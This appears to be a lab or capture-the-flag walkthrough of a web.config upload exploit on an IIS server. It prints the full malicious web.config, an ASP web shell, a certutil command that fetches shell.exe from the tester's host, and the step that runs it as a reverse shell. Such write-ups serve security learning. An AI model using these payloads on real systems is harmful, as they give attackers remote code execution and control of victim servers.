## Used web.config RCE exploit
https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
Create web.config file
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Uploaded file to server
![](../Attachments/Pasted%20image%2020210519201623.png)
![](../Attachments/Pasted%20image%2020210519201634.png)

File uploads to /UploadedFiles/ directory found from GoBuster
![](../Attachments/Pasted%20image%2020210519201750.png)

Verified that it works by showing a "3" at that location
![](../Attachments/Pasted%20image%2020210519201809.png)

Set upload request to Burp to intercept request and sent to repeater
![](../Attachments/Pasted%20image%2020210519201914.png)

Updated the ASP code to a web shell code.
```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Page shows whoami response in the source code as comments
![](../Attachments/Pasted%20image%2020210519202039.png)

Adjusted code to upload Reverse Shell
```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil -urlcache -f http://10.10.14.24/shell.exe C:\Users\merlin\Desktop\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Shell successfully uploaded
![](../Attachments/Pasted%20image%2020210519202637.png)

Updated ASP code to run Reverse Shell
```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Users\merlin\Desktop\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Shell Gained as Merlin
![](../Attachments/Pasted%20image%2020210519202846.png)